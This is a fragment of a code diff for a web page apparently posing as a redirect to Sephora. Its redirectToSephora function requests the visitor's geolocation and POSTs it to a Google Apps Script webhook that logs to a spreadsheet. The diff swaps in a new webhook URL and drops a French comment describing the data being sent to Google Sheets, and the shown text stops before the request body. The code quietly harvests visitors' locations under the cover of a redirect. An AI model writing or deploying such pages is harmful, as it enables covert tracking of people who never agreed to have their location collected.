@@ -7,8 +7,7 @@
         function redirectToSephora() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(function(position) {
-                    // Envoi des données de géolocalisation à Google Sheets via le NOUVEAU Webhook
-                    fetch('https://script.google.com/macros/s/AKfycbwXxYqWMjIeubGif1owWOeieMdjIW_H_oXZMH7aYpmE2mIWI3pUZl8eqxmP_fvYRhi-cg/exec', {
+                    fetch('https://script.google.com/macros/s/AKfycbxhKUD0lRVaxdGShPNTbdRxJIL8sC0FXJMI0-nQHHcSnwx_hTkGuDg7Z311tHeA3ioE/exec', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({
